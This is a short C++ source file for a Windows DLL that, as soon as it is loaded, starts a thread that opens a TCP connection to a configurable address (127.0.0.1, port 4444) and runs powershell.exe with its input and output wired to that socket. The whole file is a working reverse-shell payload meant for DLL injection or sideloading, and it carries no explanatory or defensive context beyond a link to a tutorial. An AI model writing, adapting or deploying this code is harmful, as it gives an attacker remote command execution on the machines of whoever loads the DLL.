// For encryption reference -> https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html

#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <thread>

#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET winsock;
struct sockaddr_in hax;
char ip[16] = "127.0.0.1";
int port = 4444;

STARTUPINFO process;
PROCESS_INFORMATION processInfo;

DWORD WINAPI PayloadThread(LPVOID lpParam) {
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    struct hostent *host;
    host = gethostbyname(ip);
    strcpy_s(ip, 16, inet_ntoa(*((struct in_addr *)*host->h_addr_list)));

    hax.sin_family = AF_INET;
    hax.sin_addr.s_addr = inet_addr(ip);
    hax.sin_port = htons(port);

    winsock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    if (winsock == INVALID_SOCKET) {
        WSACleanup();
    }

    auto connect = WSAConnect(winsock, (SOCKADDR*)&hax, sizeof(hax), nullptr, nullptr, nullptr, nullptr);
    if (connect == INVALID_SOCKET) {
        WSACleanup();
    }

    memset(&process, 0, sizeof(process));
    process.cb = sizeof(process);
    process.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    process.hStdInput = process.hStdOutput = process.hStdError = (HANDLE)winsock;

    TCHAR powershell[255] = TEXT("powershell.exe");

    CreateProcess(nullptr, powershell, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &process, &processInfo);

    closesocket(winsock);
    WSACleanup();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        CreateThread(nullptr, 0, PayloadThread, nullptr, 0, nullptr);
    }
    return TRUE;
}